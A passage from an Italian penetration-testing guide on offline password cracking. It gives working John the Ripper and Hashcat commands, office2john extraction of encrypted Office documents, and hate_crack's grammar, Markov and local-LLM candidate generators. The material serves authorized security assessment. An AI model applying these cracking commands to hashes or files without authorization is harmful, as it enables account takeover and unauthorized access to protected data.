kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```

### Mutazione di John

Leggi _**/etc/john/john.conf**_ e configuralo

```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```

### Hashcat

#### Attacchi di Hashcat

- **Attacco con wordlist** (`-a 0`) con rules

**Hashcat** include già una **cartella contenente rules**, ma puoi trovare [**altre rules interessanti qui**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).

```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```

#### Spiegare e profilare i file di regole

Le regole di Hashcat eseguono gli opcode da sinistra a destra. È facile interpretarle male quando le operazioni agiscono in posizione zero: `^e ^h ^t` antepone `e`, poi `h`, poi `t` e trasforma quindi `password` in `thepassword`. Le sostituzioni confrontano i byte distinguendo tra maiuscole e minuscole, quindi una regola come `sa@` non produce modifiche su una `A` maiuscola. Prima di dedicarvi tempo GPU, verificate le regole sconosciute con parole base rappresentative in minuscolo, maiuscolo e con maiuscole e minuscole miste.<sup>[[6]](#references)[[9]](#references)</sup>

[HashcatRosetta](https://github.com/bandrel/HashcatRosetta) può mostrare ogni candidato intermedio e riepilogare la distribuzione degli opcode di un intero file di regole. I conteggi statici degli opcode rivelano se un file perlopiù aggiunge, antepone, sostituisce o tronca caratteri. Non dimostrano che una regola riuscirà a decifrare una password, ma aiutano a scegliere un set di regole adatto ai pattern di password osservati nella popolazione target.<sup>[[6]](#references)[[9]](#references)</sup>

```bash
uv tool install git+https://github.com/bandrel/HashcatRosetta.git
hashcat-rosetta --explain '^e ^h ^t' --baseword password
hashcat-rosetta rules.rule --analyze-rules
```

#### Ridurre le regole ridondanti con i log di debug

La modalità debug di Hashcat registra le trasformazioni delle regole separatamente dal normale output di stato e dei risultati. La modalità `4` scrive `baseword:rule:candidate`; la modalità `5` aggiunge la wordlist sorgente. Imposta sempre esplicitamente `--debug-file`. In caso contrario, Hashcat apre `hashcat.debugfile` nella directory del profilo e, reindirizzando stdout, acquisisci il flusso della console anziché questi record. I file di debug vengono aperti in modalità append, quindi rimuovi o ruota un vecchio file prima di una nuova misurazione e proteggilo perché contiene parole base e candidati in testo semplice.<sup>[[7]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
rm -f debug.txt
hashcat -m 1000 -a 0 --debug-mode 5 --debug-file debug.txt \
  -r rules.rule hashes.txt wordlist.txt
hashcat-rosetta debug.txt --rules --metric candidates --top 25
hashcat-rosetta debug.txt --basewords --detail
hashcat-rosetta debug.txt --wordlists --detail
hashcat-rosetta debug.txt --export report.json --format json
```

Usa `frequency` per trovare le regole applicate più spesso, `basewords` per misurare la copertura degli input distinti e `candidates` per contare gli output distinti. In genere, il ranking dei candidate è il punto di partenza migliore per ridurre l’elenco, perché una regola applicata spesso può comunque far convergere molti input su candidate duplicati. Copia le regole di maggior valore in un file più piccolo, eseguilo di nuovo sugli hash rimanenti e confronta i report tra un’esecuzione e l’altra. La modalità `5` mostra anche se ciascuna wordlist di origine fornisce basewords utili; forza il parsing con `--debug-mode 4` o `--debug-mode 5` quando i due punti nei dati rendono ambiguo il rilevamento automatico.<sup>[[6]](#references)[[9]](#references)</sup>

- **Attacco Wordlist combinator**

Con hashcat è possibile **combinare 2 wordlist in 1**.\
Se la lista 1 contenesse la parola **"hello"** e la seconda contenesse 2 righe con le parole **"world"** e **"earth"**, verrebbero generate le parole `helloworld` e `helloearth`.

```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```

#### Grammar-driven combinator attacks (esempio con Office crittografato)

Una password può essere lunga e contenere diverse classi di caratteri, ma avere comunque uno **spazio di ricerca effettivo** ridotto se segue una grammatica nota. Per un documento Office crittografato ottenuto durante una valutazione autorizzata, `office2john.py` estrae il record di verifica della password, consentendo di provare password localmente senza blocchi, limitazioni della frequenza o MFA online. Non aggira la crittografia del documento.<sup>[[2]](#references)[[5]](#references)</sup>

Rimuovi il campo del nome file che John antepone, in modo che Hashcat riceva solo il verificatore:<sup>[[2]](#references)</sup>

```bash
python3 /path/to/office2john.py secrets.xlsx | sed 's/^[^:]*://' > office.hash
head -c 40 office.hash; echo
```

Seleziona `-m` in base al prefisso estratto, non all'estensione del file. Hashcat associa `$office$*2007*`, `$office$*2010*` e `$office$*2013*` alle modalità `9400`, `9500` e `9600`; i record legacy `$oldoffice$0/$1` e `$oldoffice$3/$4` usano rispettivamente le modalità `9700` e `9800`.<sup>[[3]](#references)</sup>

Se le informazioni sul riutilizzo delle password, le policy, gli indizi o le persone che conoscono l'utente rivelano una struttura come `<word><number><optional !><word>`, inserisci il prefisso enumerabile in modo indipendente nel dizionario a sinistra. Questo esempio prova i numeri da `0` a `99`; sostituisci l'intervallo e le trasformazioni con elementi comprovati durante l'assessment.<sup>[[5]](#references)</sup>

```bash
while IFS= read -r word; do
  for number in $(seq 0 99); do
    printf '%s%s\n%s%s!\n' "$word" "$number" "$word" "$number"
  done
done < words.txt > wordsAndNumbers.txt
```

La modalità di attacco `1` di Hashcat aggiunge ogni riga del dizionario di destra a ogni riga del dizionario di sinistra, quindi i file contenenti rispettivamente `L` e `R` righe producono `L × R` candidati prima dell’applicazione di eventuali regole. Il comando seguente è specifico per un record legacy `$oldoffice$3/$4`; cambia la modalità per altri formati di Office.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

```bash
hashcat -m 9800 -a 1 office.hash wordsAndNumbers.txt english-88k-upper.txt
```

Questo pattern di pre-elaborazione si generalizza ad altri formati verificabili offline: enumerare solo le varianti plausibili di maiuscole e minuscole, date, separatori, cifre o punteggiatura per un componente, quindi combinarlo con il componente rimanente invece di eseguire un brute-force sull'intera lunghezza nominale.<sup>[[4]](#references)[[5]](#references)</sup>

- **Mask attack** (`-a 3`)

```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```

#### Convalida i file `.hcmask` prima dell'esecuzione

Una riga malformata può passare inosservata tra maschere valide, quindi convalida l'intero file e lo spazio delle chiavi stimato prima di avviare l'attacco. HashcatRosetta segnala la riga che causa l'errore e restituisce uno stato diverso da zero se una qualsiasi maschera non è valida, rendendo questo controllo adatto a script o CI.<sup>[[6]](#references)[[9]](#references)</sup>

```bash
hashcat-rosetta masks.hcmask --verify-masks
```

Non normalizzare i file mask con parser generici per CSV o testo. Hashcat supporta i charset personalizzati `?1` fino a `?8`, tratta `#` come commento solo quando è il primo byte e rimuove gli escape con backslash in un solo passaggio, prima di interpretare i token `?`. Pertanto, gli spazi iniziali prima di `#` sono dati della mask e l’escaping può cambiare se una sequenza viene interpretata come valore letterale o come token di charset.<sup>[[6]](#references)[[9]](#references)</sup>

- Attacco Wordlist + Mask (`-a 6`) / Mask + Wordlist (`-a 7`)

```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```

#### Pass di Hashcat addestrati sul target con hate_crack

[hate_crack](https://github.com/trustedsec/hate_crack) orchestra i passaggi locali di Hashcat dopo che hai un file di hash e conosci la modalità Hashcat. Hashcat deve essere installato separatamente. Clona il repository con i submodule, esegui `make`, quindi avvia una sessione interattiva; la modalità di esempio `1000` è NTLM, non un valore predefinito universale. Nei cloni esistenti, esegui `git submodule update --init --recursive` prima di usare le opzioni PCFG e PRINCE-LING.<sup>[[13]](#references)[[14]](#references)</sup>

```bash
git clone --recurse-submodules https://github.com/trustedsec/hate_crack.git
cd hate_crack
make
hate_crack hashes.txt 1000
```

**Apprendi una grammatica dai testi in chiaro recuperati.** Esegui una prima passata con dizionario/regole, quindi addestra `pcfg_cracker` usando testi in chiaro pertinenti al target. Imposta `pcfgRuleset` in `config.json` sul ruleset addestrato e scegli PCFG (menu `20`) per inviare a Hashcat strutture probabili in streaming, oppure PRINCE-LING (`21`) per creare una lista base PRINCE guidata dalla grammatica. Limita i due generatori con `pcfgMaxCandidates` e `pcfgPrinceLingMaxCandidates`; hate_crack non addestra la grammatica al posto tuo. PCFG apprende la probabilità di strutture come parola base più cifre e simboli, a differenza della grammatica fissa nell'[esempio combinator](#grammar-driven-combinator-attacks-encrypted-office-example).<sup>[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
cd pcfg_cracker
python3 trainer.py -t ../target-plaintexts.txt -r TARGET
cd ..
# Set pcfgRuleset to TARGET in config.json, then select 20 or 21.
hate_crack hashes.txt 1000
```

**Ricava le rules a ritroso dalle password note.** Spoonman (menu `22`) prende un corpus in chiaro, incluso il file `.out` non vuoto della sessione corrente, e ricava baseword in minuscolo più rules di Hashcat che ricostruiscono le password osservate. Classifica le rules in base al numero di password del corpus che riproducono. Inizia dalla fascia con copertura del 50% più alta ed espandi solo se il keyspace aggiuntivo è giustificato; combina i baseword ricavati con altre wordlist pertinenti quando la copertura è limitata dallo stem mancante, non dalla mutazione. Hashcat accetta al massimo 31 funzioni per rule e il suo alfabeto delle posizioni fa riferimento solo agli indici da `0` a `35`; quando una password non può essere codificata, Spoonman usa un baseword letterale e una rule no-op. I corpus molto grandi possono raggiungere il limite del contatore a memoria limitata: leggi la copertura riportata senza presumere che la ricostruzione sia completa. Prima di riutilizzare l'output autonomamente, consulta [il comportamento delle rules di Hashcat](#explain-and-profile-rule-files).<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

**Scegli un generatore in base alle evidenze disponibili.** OMEN (`13`) addestra un modello di transizione dei caratteri a partire da una lista di password ed enumera i candidati in ordine di probabilità, fino al limite impostato da `omenMaxCandidates`. Il brute force Markov (`15`) può invece creare una tabella `.hcstat2` usando i crack del file `.out` corrente o una lista selezionata, e testare un intervallo incrementale di lunghezze. Quando le informazioni sul target sono in forma di prosa anziché di password, N-gram (`16`) passa un corpus, anche in formato gzip, a `ngramX.bin`; la dimensione predefinita del gruppo è tre. Sono alternative, non tre copie della stessa lista di candidati.<sup>[[11]](#references)[[13]](#references)[[14]](#references)</sup>

**Espandi solo pool ridotti e plausibili.** Permutation (`17`) riordina ogni carattere di ciascuna parola in input, quindi anche una sola parola di otto caratteri genera `8!` ordinamenti. Combipow (`19`) genera combinazioni di sottoinsiemi non vuoti da un breve pool di parole passphrase; `-s` inserisce spazi e lo strumento rifiuta più di 63 righe in input. Combinator (`6`) può unire più wordlist con separatori tramite `--sepFill`; la concatenazione standard di due liste è coperta dal [combinator nativo di Hashcat](#hashcat-attacks) qui sopra.<sup>[[13]](#references)[[14]](#references)</sup>

**Pianifica gli attacchi con feedback.** Fingerprint (`5`) espande iterativamente le password appena crackate usando frammenti di lunghezza crescente, invece di riespandere l'intero corpus a ogni round; la soglia del keyspace delle combinazioni salta un passaggio `-a 1` troppo oneroso. Hybrid (`7`) prova decorazioni `?s?d` meno costose prima delle mask più ampie con prefisso/suffisso `?a`, mentre `hcatHybridMaxRuntime` limita la durata dell'esecuzione. È importante perché il costo di un passaggio hybrid è la dimensione della wordlist moltiplicata per lo spazio della mask: una mask ampia applicata a una lista grande può superare di molto i passaggi iniziali.<sup>[[13]](#references)[[14]](#references)</sup>

**Genera candidati dalle password recuperate con un LLM locale.** Dopo che un passaggio iniziale ha prodotto un file `<hashfile>.out` non vuoto, l'attacco LLM di hate_crack (menu principale `12`, sottomenu **Cracked passwords** `3`) può dedurre baseword, anni, suffissi e uso di maiuscole/minuscole specifici del target, quindi inviare nuovi candidati a Hashcat. I corpus ridotti possono includere le password in chiaro recuperate nel prompt del modello; i corpus più grandi vengono invece riassunti in statistiche. Questo generalizza le convenzioni osservate, anziché limitarsi a riprodurre le [rules](#explain-and-profile-rule-files) o le [mask](#hashcat-attacks) predefinite qui sopra.<sup>[[13]](#references)[[14]](#references)</sup>

Configura in `.env` di hate_crack un modello Ollama locale già in esecuzione: il modello non viene scaricato automaticamente. `OLLAMA_NO_CLOUD=true` rifiuta i modelli contrassegnati come cloud e gli indirizzi degli endpoint esterni. Un endpoint localhost da solo non basta: Ollama può inoltrare le richieste a un modello `-cloud` remoto e i prompt possono contenere password in chiaro recuperate o statistiche del corpus. Questa impostazione consente comunque gli endpoint di reti private e non può escludere un proxy di trasporto: verifica quindi il percorso di inferenza prima di inviare dati dei client.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

```dotenv
LLM_BACKEND=ollama
OLLAMA_HOST=localhost:11434
OLLAMA_MODEL=qwen3:4b-instruct
OLLAMA_NO_CLOUD=true
```

```bash
hate_crack hashes.txt 1000
# Select 12 (LLM Attack), then 3 (Cracked passwords).
```

Confronta la resa delle candidate con passaggi meno costosi basati su regole, mask e addestramento sul target prima di allocare un budget maggiore. Il modello genera tentativi; Hashcat li verifica rispetto agli hash.<sup>[[13]](#references)[[14]](#references)</sup>

#### Modalità Hashcat

```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```

Cracking degli hash Linux - file /etc/shadow

```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```

Cracking degli hash di Windows

```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```

Cracking degli hash delle applicazioni più comuni

```
  900 | MD4                                              | Raw Hash
    0 | MD5                                              | Raw Hash
 5100 | Half MD5                                         | Raw Hash
  100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
 1400 | SHA-256                                          | Raw Hash
 1700 | SHA-512                                          | Raw Hash
```

## References

- [1] [Dentro GoBruteforcer: impostazioni predefinite del server generate dall'IA, password deboli e campagne incentrate sulle criptovalute](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
- [2] [John the Ripper: `office2john.py`](https://github.com/openwall/john/blob/bleeding-jumbo/run/office2john.py)
- [3] [Hash di esempio di Hashcat e modalità Microsoft Office](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [4] [Attacco combinator di Hashcat](https://hashcat.net/wiki/doku.php?id=combinator_attack)
- [5] [Pianificazione successoria delle credenziali](https://pentestpartners.com/security-blog/estate-planning-of-credentials)
- [6] [Repository HashcatRosetta](https://github.com/bandrel/HashcatRosetta)
- [7] [Implementazione del file di debug di Hashcat](https://github.com/hashcat/hashcat/blob/master/src/debugfile.c)
- [8] [Guida della riga di comando di Hashcat](https://github.com/hashcat/hashcat/blob/master/docs/hashcat-help.md)
- [9] [HashcatRosetta: leggere la Stele di Rosetta del password cracking](https://trustedsec.com/blog/hashcatrosetta-reading-the-rosetta-stone-of-password-cracking)
- [10] [Repository e utilizzo di PCFG Cracker](https://github.com/lakiw/pcfg_cracker)
- [11] [Repository e guida utente di OMEN](https://github.com/RUB-SysSec/OMEN)
- [12] [Issue originale di Spoonman e progettazione della derivazione delle regole](https://github.com/trustedsec/hate_crack/issues/169)
- [13] [Repository di hate_crack e documentazione degli attacchi](https://github.com/trustedsec/hate_crack)
- [14] [Novità in hate_crack dalla versione 2.0](https://trustedsec.com/blog/whats-new-in-hate-crack-since-2-0)
- [15] [Policy di destinazione LLM di hate_crack](https://github.com/trustedsec/hate_crack/blob/main/hate_crack/llm.py)
{{#include ../banners/hacktricks-training.md}}
